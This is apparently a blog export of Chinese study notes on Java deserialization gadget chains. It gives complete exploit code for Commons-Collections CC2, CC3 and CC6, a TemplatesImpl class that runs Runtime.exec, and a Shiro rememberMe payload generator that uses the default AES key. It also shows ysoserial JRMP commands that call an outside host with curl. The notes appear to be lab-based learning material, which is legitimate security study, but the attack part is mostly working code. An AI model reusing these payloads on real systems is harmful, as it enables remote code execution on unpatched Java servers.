TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tCollections.reverseOrder());\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n\n\n","slug":"Java反序列化7笔记","date":"2022-09-16T11:41:44.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"4a2c67097cc575b58a19c08f5d864189","title":"Java反序列化6笔记","content":"\n\n参考资料：p牛 Java安全漫谈16 \nhttps://t.zsxq.com/06JeeqbMN\nJava Things\nhttps://github.com/phith0n/JavaThings\nPriorityQueue源码分析\nhttps://www.cnblogs.com/linghu-java/p/9467805.html\nCommons-Collections4：官方认为以前的 commons-collections 设计的有问题，所以官方重做了，就出现了org.apache.commons:Commons-Collections4，而且重做后在同一个项目可以同时存在老的Commons-Collections和新的Commons-Collections4。\n在将以前的CC链的Commons-Collections替换成Commons-Collections4后执行会报错，官方去除了LazyMap.decorate方法，改了个名字换成了LazyMap.lazyMap方法，当然还有其他的类的decorate方法，都是改了个名字，将方法名替换后就可以成功执行。\nCommons-Collections版：\n public static Map decorate(Map map, Transformer factory) &#123; \n\nreturn new LazyMap(map, factory); \n\n&#125;  \n\nCommons-Collections4版：\n public static  LazyMap lazyMap(final Map map, final Transformer factory) &#123; \n\nreturn new LazyMap(map, factory);\n\n &#125; \n\n\n\nCommons Collections2：在替换为Commons-Collections4后，又新增了几条利用链，比如现在学习的Commons-Collections2利用链\nCommons-Collections经常使用的原因，原文：commons-collections这个包之所有能攒出那么多利用链来，除了因为其使用量大，技术上的原因是其 中包含了⼀些可以执行任意方法的Transformer。所以，在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从 Serializable#readObject() 方法到 Transformer#transform() 方法的调用链。  \nPriorityQueue ：CC2使用了新的链路，通过java.util.PriorityQueue类，和 org.apache.commons.collections4.comparators.TransformingComparator类\n其中PriorityQueue的readObject方法中，会调用heapify方法\n\nheapify方法或调用siftDown方法\n\nsiftDown方法则会进行判断，如果comparator存在则会调用siftDownUsingComparator方法\n\nsiftDownUsingComparator顾名思义就是用comparator进行比较，它会调用comparator的compare方法\n\n而TransformingComparator中含有compare方法，并且会触发transform\n\n这样利用链就清楚了，只需实例化一个TransformingComparator对象包裹前面的transformerChain让其作为comparator，之后实例化PriorityQueue对象，将comparator传入，同时随意添加两个非null参数，两个才能触发比较\n这样在比较前面，对会通过TransformingComparator.compare触发回调\n调式的时候发现会触发两次\n完整代码：package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.functors.ChainedTransformer;\nimport org.apache.commons.collections4.functors.ConstantTransformer;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\n\npublic class CommonsCollections2 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\t\t Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\t\t field.setAccessible(true);\n\t\t\t field.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t&#x2F;&#x2F;正常流程\n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new\n\t\t\tConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[] &#123;\n\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n\t\t\t Class[].class &#125;, \n\t\t\tnew Object[] &#123; &quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n\t\t\t\t\tObject[].class &#125;, \n\t\t\tnew Object[] &#123; null, new Object[0] &#125;),\n\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n\t\t\tnew String[] &#123; &quot;calc.exe&quot; &#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\t\t&#x2F;&#x2F;实例化一个TransformingComparator用来包裹\n\t\tComparator comparator &#x3D; new TransformingComparator(transformerChain);\n\t\t&#x2F;&#x2F;使用PriorityQueue触发排序，最少两个数，传入设计好的比较器\n\t\tPriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n\t\t&#x2F;&#x2F;可传入任意非null参数，transformer忽略传入参数\n\t\tqueue.add(1);\n\t\tqueue.add(2);\n\t\t&#x2F;&#x2F;换成恶意transformer\n\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t&#x2F;&#x2F;序列化\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\t&#x2F;&#x2F;反序列化\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\n\t&#125;\n\n&#125;\n\n\n\n\n\nCC2TemplatesImpl：同样可以使用TemplatesImpl\n还是一样下先传入非恶意的InvokerTransformer，用它实例化comparator，同时传入比较的参数为实例化的TemplatesImpl，之后在修改InvokerTransformer为恶意的newTransformer\n通过comparator将TemplatesImpl传递到transform，再传给newTransfoemer\n完整代码：\npackage com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections4.Transformer;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.Comparator;\nimport java.util.PriorityQueue;\n\npublic class CommonsCollections2TemplatesImpl &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\t&#x2F;&#x2F;获取恶意class\n    protected static byte[] getBytescode() throws Exception &#123;\n        ClassPool pool &#x3D; ClassPool.getDefault();\n        CtClass clazz &#x3D; pool.get(com.shiroattack.Evil.class.getName());\n        return clazz.toBytecode();\n    &#125;\n\n    public static void main(String[] args) throws Exception &#123;\n        TemplatesImpl obj &#x3D; new TemplatesImpl();\n        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;getBytescode()&#125;);\n        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n        Transformer transformer &#x3D; new InvokerTransformer(&quot;toString&quot;, null, null);\n        Comparator comparator &#x3D; new TransformingComparator(transformer);\n        PriorityQueue queue &#x3D; new PriorityQueue(2, comparator);\n        queue.add(obj);\n        queue.add(obj);\n\n        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(queue);\n        oos.close();\n\n&#x2F;&#x2F;        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n\n&#125;\n\n\n\n\ncommons-collections 的官方修复commons-collections3.2.2：如果没有设置 org.apache.commons.collections.enableUnsafeSerialization=true ，那么将不会允许一些Transforme类的readObject的调用\ncommons-collections4.1这个修复更加简单粗暴，直接不实现Serializable接口，这样就无法序列化和反序列化\n","slug":"Java反序列化6笔记","date":"2022-09-16T11:41:20.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"98f7491bb751eb8b6537f6ad2a4d2b25","title":"Java反序列化5笔记","content":"\n\n参考资料：p牛 Java安全漫谈 15\nhttps://t.zsxq.com/06NneiyFI\nJava Things\nhttps://github.com/phith0n/JavaThings\nOrange blog文章：\nhttp://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\nzsx blog文章：\nhttps://blog.zsxsoft.com/post/35\nJava反序列化利用链分析shiro\nhttps://www.anquanke.com/post/id/192619\nShiro反序列化：Tomcat部署：下载：\nhttps://tomcat.apache.org/\n解压到不带中文的路径，环境变量设置好JAVA_HOME，在解压的bin文件夹下双击setup.bat即可运行，之后在浏览器访问ip:8080即可看到tomcat页面\n安装8.x和9.x都不能运行，改为7.x就ok了，我的jdk是8u71\nhttps://archive.apache.org/dist/tomcat/tomcat-7/v7.0.56/bin/\n设置\nCATALINE_HOME： D:\\1Tomcat\\apache-tomcat-7.0.56\\\nCATALINE_BASE：D:\\1Tomcat\\apache-tomcat-7.0.56\\\n将JavaThings里面的shirodemo打包\nmvn package \n将生成的war包放到tomcat的webapps目录，在bin目录使用startup.bat启动tomcat服务，访问ip:8080/shirodemo 访问搭建的服务\n账号密码：root/secret\n打开服务本地抓包发现有问题，根本抓不到本地的数据包\n用靶场虚拟机去抓包，可以成功\n在新建一个包，将Javathings的CC6和Client0写好，添加shiro-all-1.2.4.jar插件\n运行Client0报错：\nException in thread “main” java.lang.NoClassDefFoundError: org/slf4j/LoggerFactory\n据说是因为没有下载依赖\nslf4j-log4j12-1.7.22.jar   slf4j-api-1.7.22.jar\n在https://nowjava.com/jar/search下载，添加到eclipse的build path里面\n又报错：Failed to instantiate SLF4J LoggerFactory\n查文档，需要删除slf4j-log4j12这个依赖，删除后有错误但是能生成payload\nSLF4J: Failed to load class “org.slf4j.impl.StaticLoggerBinder”.\nSLF4J: Defaulting to no-operation (NOP) logger implementation\nSLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.\n再查文档，发现提供了替代品\nslf4j-nop-1.7.2.jar\nslf4j-simple.jar,\nslf4j-log4j12.jar,\nslf4j-jdk14.jar\nlogback-classic.jar \n下载第一个，加入依赖，perfect完美解决\n将生成payload作为Cookie的rememberMe发送，再tomcat的窗口回车让其显示信息，发现报错，无法加载\n\n\n\n原因：\norg.apache.shiro.io.ClassResolvingObjectInputStream  这个类重写了其父类ObjectInputStream的resolveClass方法\n两者区别是子类使用 org.apache.shiro.util.ClassUtils#forName 实际上是用 org.apache.catalina.loader.ParallelWebappClassLoader#loadClass 来查找类  ，父类使用Java原生的Class.forName来找类\n在加载类名为 [Lorg.apache.commons.collections.Transformer;  的类出现异常\n通过阅读两篇文档：\nhttps://blog.zsxsoft.com/post/35\nhttp://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html\n第二篇本来是这个：http://www.rai4over.cn/2020/Shiro-1-2-4-RememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2016-4437/#%E8%B7%B3%E5%9D%91\n但是博客没了，所以找找找，在现在的第二篇的评论区发现了真正的原因\nJava原生的Class.forName的确不能加载数组，但是在shiro中是可以的，真实的原因是因为jdk和tomcat的classpath冲突，所以只能正常加载jdk内部的数组形式的类，而在tomcat中加载第三方就会导致找不到，只需添加tomcat启动设置，或者设置loader就行，原文没了，所以怎么设置也不知道\n这个问题老是出现，是真的烦\n构造不含数组的利用链：前面用CC6是含有Transformer数组的，所以利用不成功，现在需要找不含数组的利用链\nJRMP 利用链：同样是前面的第二篇文章里面提到了yso的JRMP 利用链\n使用URLDNS判断漏洞是否存在\njava -jar ysoserial-master-SNAPSHOT.jar URLDNS http:&#x2F;&#x2F;mydnsserver.orange.tw&#x2F; | python exp.py \n\n接着使用JRMP反弹shell\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 &#39;curl orange.tw&#39;\n\n# listen 一個 RMI server 走 JRMP 協議在 12345 port 上\njava -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;1.2.3.4:12345&#39;| python exp.py \n\n# 使用 JRMPClient 去連接剛剛 listen 的 server\n改造CC6：用 TemplatesImpl  加载字节码：\nTemplatesImpl obj &#x3D; new TemplatesImpl(); \n\nsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;&quot;...bytescode&quot;&#125;); \n\nsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\nsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); obj.newTransformer();  \n\n利用 InvokerTransformer 调用 TemplatesImpl#newTransformer 方法：  \nTransformer[] transformers &#x3D; new Transformer[]&#123; new ConstantTransformer(obj), \n\nnew  InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;  \n\n但是这里也使用了数组，在这篇文中提到解决方法：\nhttps://www.anquanke.com/post/id/192619\nCC6里使用 TiedMapEntry 类，其构造参数有两个参数，前面为map，后者为key\nCC6时这个key是无所谓的，但是在TiedMapEntry类中给有个getValue方法，调用了\nmap.get(key)，当这个map是LazyMap是，get方法就是触发transform的点，这个key会被传进transform()\n而ConstantTransformer的作用是包裹一个对象，在执行回调时返回这个对象\n所以，这个key可以代替ConstantTransformer\n创建一个InvokerTransformer来调用newTransformer方法，先传入一个无害方法，后面再替换\nTransformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);  \n\n再修改TiedMapEntry的key为TemplatesImpl对象\nMap innerMap &#x3D; new HashMap(); \n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformer); \n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj); \n\nMap expMap &#x3D; new HashMap(); \n\nexpMap.put(tme, &quot;valuevalue&quot;); \n\nouterMap.clear();  \n\n使用outerMap.clear()的作用和前面outerMap.remove(“keykey”)一样\np牛封装好的代码：\npackage com.shiroattack;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollectionsShiro &#123;\n\t public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n\n\t    public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t        TemplatesImpl obj &#x3D; new TemplatesImpl();\n\t        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        Transformer transformer &#x3D; new InvokerTransformer(&quot;getClass&quot;, null, null);\n\n\t        Map innerMap &#x3D; new HashMap();\n\t        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformer);\n\n\t        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, obj);\n\n\t        Map expMap &#x3D; new HashMap();\n\t        expMap.put(tme, &quot;valuevalue&quot;);\n\n\t        outerMap.clear();\n\t        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);\n\n\t        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t        &#x2F;&#x2F; 生成序列化字符串\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(expMap);\n\t        oos.close();\n\n\t        return barr.toByteArray();\n\t    &#125;\n\n&#125;\n\n\nClient.java生成payload的程序：\npackage com.shiroattack;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.shiro.crypto.AesCipherService;\nimport org.apache.shiro.util.ByteSource;\n\npublic class Client &#123;\n\tpublic static void main(String []args) throws Exception &#123;\n\t\tClassPool pool &#x3D; ClassPool.getDefault();\n\t\tCtClass clazz &#x3D;\n\t\t\t\tpool.get(com.shiroattack.Evil.class.getName());\n\t\tbyte[] payloads &#x3D; new\n\t\t\t\tCommonsCollectionsShiro().getPayload(clazz.toBytecode());\n\t\tAesCipherService aes &#x3D; new AesCipherService();\n\t\tbyte[] key &#x3D;\n\t\t\t\tjava.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;);\n\n\t\tByteSource ciphertext &#x3D; aes.encrypt(payloads, key);\n\t\tSystem.out.printf(ciphertext.toString());\n\t&#125;\n\n&#125;\n\n\n使用的javassit是字节码操纵的第三方库，作用是将恶意类生成字节码交给TemplatesImpl\n测试：生成payload，发送数据包\n\n报错了。。。。。\n检测发现是恶意类的原因，我使用的是前面BECL加载的恶意类，修改成com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类那个恶意类就没有问题\npackage com.TemplatesImplTest;\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\n\n&#x2F;&#x2F;必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类\npublic class HelloTemplateImplTest extends AbstractTranslet &#123;\n\tpublic void transform(DOM document, SerializationHandler[] handlers) \n\t\t\tthrows TransletException &#123;\n\t    &#125;\n\tpublic void transform(DOM document, DTMAxisIterator iterator, \n\t\t\tSerializationHandler handler) throws TransletException &#123;\n\t    &#125;\n\n\tpublic HelloTemplateImplTest () throws Exception  &#123;\n\t        super();\n\t        Runtime.getRuntime().exec(&quot;calc&quot;);\n\t    &#125;\n&#125;\n\n有点麻烦的是需要在tomcat窗口自己手动回车才会收到响应，不影响弹计算器，实战应该没有这个问题\n","slug":"Java反序列化5笔记","date":"2022-09-13T14:10:58.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"28bef31494b30752ba9f1f07e41299e2","title":"Java反序列化4笔记","content":"\n\n参考资料：p牛 Java安全漫谈 14   \nhttps://t.zsxq.com/05rjA2NJU\np牛 JavaThings\nhttps://github.com/phith0n/JavaThings\nCommon Collection3InvokerTransformerCC1使用transfoemers讲几个不同的transfeomer包裹，在使用chainedtansformer将前一个tansformer的输出作为后一个tansformer的输入，再将其作为hashmap对象的回调，当put新值时就会触发回调执行命令\n动态加载字节码，使用TemplatesImpl加载字节码（动态码笔记就不放在博客了）\nCC3初始，将CC1和TemplatesImpl结合\n代码在testclass里面，太长就不贴了\n漫谈中提到，在发布yso后，有人发布了过滤反序列化链的工具SerialKiller，在这个工具中将CC1的invokertransformer类添加为黑名单，所以我们将不能使用它\ncom.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类的构造方法中调用了 (TransformerImpl) templates.newTransformer()，免去使用InvokerTransformer手动调用newTransformer方法之一步\n这时个TransformerImpl对象，可以直接加载字节码\n但是，没有InvokerTransformer就无法使用TrAXFilter 类中的构造方法\n所以，需要 org.apache.commons.collections.functors.InstantiateTransformer  类，这个类也是一个实现了Transformer接口的类，作用是调用构造方法\n这样链路就完整了\n修改的Transformer调用链：\nTransformer[] transformers &#x3D; new Transformer[]&#123; \n\n\tnew ConstantTransformer(TrAXFilter.class), \n\n\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\n\tnew Object[] &#123; obj &#125;) \n&#125;;  \n\n将前面使用InvokerTransformer的Transformer替换即可\n注意：通前面的CC1一样，这也只是个demo，没有序列化，同时也只支持jdk8u71以下\n可以参考前面先让其序列化，在通过CC6文中介绍修改该链让其通杀\np牛改造的可以在jdk8u71以下执行\n再按照CC6修改以下，成功在大于jdk8u71时执行命令\n完整代码：package org.vulhub.sec;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InstantiateTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.util.HashMap;\nimport java.util.Map;\n\n&#x2F;&#x2F;通用版本\npublic class CommonCollection3 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n        field.setAccessible(true);\n        field.set(obj, value);\n    &#125;\n\tpublic static void main(String[] args) throws Exception &#123;\t \n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n&#x2F;&#x2F;\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n &#x2F;&#x2F;加载恶意类生成字节码，javassist第三方库            \n            ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplateImplTest.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t \n\t\tTransformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123; \n\t\t\t\tnew ConstantTransformer(TrAXFilter.class), \n\t\t\t\tnew InstantiateTransformer( new Class[] &#123; Templates.class &#125;, \n\t\t\t\tnew Object[] &#123; obj &#125;) \n\t\t&#125;; \n\t\tTransformer transformerChain &#x3D; new\n\t\t\t\tChainedTransformer(fakeTransformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t&#x2F;&#x2F;通用链，使用TiedMapEntry\n\t\tTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\t\t\n\t\tMap expMap &#x3D; new HashMap();\n\t\texpMap.put(tme, &quot;valuevalue&quot;);\n\t\touterMap.remove(&quot;keykey&quot;);\n\t\t\n\t\tField f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n        \n\t\t&#x2F;&#x2F;利用反射调用执行，这样不需要在之后输入map\n&#x2F;&#x2F;\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n&#x2F;&#x2F;\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n&#x2F;&#x2F;\t\tconstruct.setAccessible(true);\n        \n&#x2F;&#x2F;\t    InvocationHandler handler &#x3D; (InvocationHandler) construct.newInstance(Retention.class, outerMap);\n&#x2F;&#x2F;\t\tsetFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);\n\t\t \n\t\t&#x2F;&#x2F;序列化\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t&#x2F;&#x2F;写入数据\n\t\toos.writeObject(expMap);\n\t\toos.close();\n\t\t&#x2F;&#x2F;写入ObjectInputStream\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t&#x2F;&#x2F;反序列化\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n\n\n","slug":"Java反序列化4笔记","date":"2022-09-13T14:10:44.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"cc6f53e8dc634d13d7c94fb0decfd921","title":"Java反序列化3笔记","content":"\n\n参考资料：p牛 Java安全漫谈 12   Java反序列化6\nhttps://t.zsxq.com/05vVVfAeI\nCommon Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6\nAnnotationInvocationHandler类的readobject逻辑发生改变，无法在通过其调用LazyMap的get方法，而CC6链则发现一种新的可以调用LazyMap的get方法的类，通过TiedMapEntry类触发Lazy的get方法\norg.apache.commons.collections.keyvalue.TiedMapEntry在其getValue方法中直接返回map.get(key)，在此处调用了输入map的get方法\n\n同时该类里的hashCode方法又无条件的调用了getValue方法\n\n在前面的利用链里，hashmap的readobject方法调用了hash方法，而在hash方法里又调用了key的hashcode方法，所以这个利用链就完整了\n\n只需让hash方法的key为TiedMapEntry对象即可触发该类的hashcode方法\n将前面CC1链中获取的恶意LazyMap对象作为TiedMapEntry的map属性，实例化一个TiedMapEntry对象\nMap innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\n&#x2F;&#x2F;通用链，使用TiedMapEntry\n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n之后将其转化为hashmap对象的key\nMap expMap &#x3D; new HashMap();\n\nexpMap.put(tme, &quot;valuevalue&quot;);\n\n接着就能直接序列化和反序列化试试\n发现可以序列化但是无法弹出计算器\n原因在于反序列化时LazyMap的get方法进行了一个判断，当这个输入的key不存在这个map中时才会执行put操作，而调式发现这里输入的key为前面的keykey，这个keykey是存在于map中的，所以没有进入if判断\n还有一个原因是p牛的代码中没有直接将恶意回调放在Lazy里，而是先放一个不执行命令的回调，在put之后修改这个回调为恶意回调\n在将TiedMapEntry对象设置为hashmap的key时执行力put操作，而put方法里又调用了hash(key)，所以调式时是在这里就触发了利用链，在p牛的代码中，这时的回调并不是命令执行的回调，才会导致无法执行命令\n将其换成执行命令的回调是会导致命令执行，但是并不是我们需要的反序列化时的执行，而是直接在执行put操作时就执行了命令\n所以为了解决这个问题，需要在put之后将keykey值移除，在修改回调为恶意回调\n\n为了明显查看，所以直接在前面就将回调设置为执行命令的回调，调式发现弹出来两次计算机，一次是在put时就弹出，一次是在readobject时弹出，说明前面的分析没有问题\n这个代码真是缺一不可，真巧妙\n完整代码：package org.vulhub.sec;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollections6 &#123;\n    public static void main(String[] args) throws Exception &#123;\n    \t&#x2F;&#x2F;防止本地调式在put时触发命令执行\n        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n        Transformer[] transformers &#x3D; new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new 